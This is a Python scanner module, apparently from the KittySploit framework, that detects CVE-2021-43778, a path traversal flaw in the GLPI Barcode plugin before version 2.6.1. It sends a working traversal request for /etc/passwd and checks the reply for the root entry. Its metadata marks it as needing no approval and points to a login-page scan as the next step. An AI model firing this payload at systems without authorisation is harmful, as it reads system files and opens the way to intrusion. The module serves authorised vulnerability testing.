#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Barcode is a GLPI plugin for printing barcodes and QR codes."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GLPI plugin Barcode < 2.6.1 - Path Traversal Vulnerability. Detection',
        'description': 'Barcode is a GLPI plugin for printing barcodes and QR codes. GLPI instances version 2.x prior to version 2.6.1 with the barcode plugin installed are vulnerable to a path traversal vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'glpi', 'lfi', 'plugin', 'traversal', 'glpi-project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/AK-blank/CVE-2021-43778',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43778',
            'https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9',
            'https://github.com/pluginsGLPI/barcode/releases/tag/2.6.1',
            'https://github.com/pluginsGLPI/barcode/commit/428c3d9adfb446e8492b1c2b7affb3d34072ff46',
        ],
        'cve': 'CVE-2021-43778',
    }

    def run(self):
        r = self.http_request(method="GET", path='/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="GLPI plugin Barcode < 2.6.1 - Path Traversal Vulnerability. detected",
                path='/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd',
            )
            return True
        return False

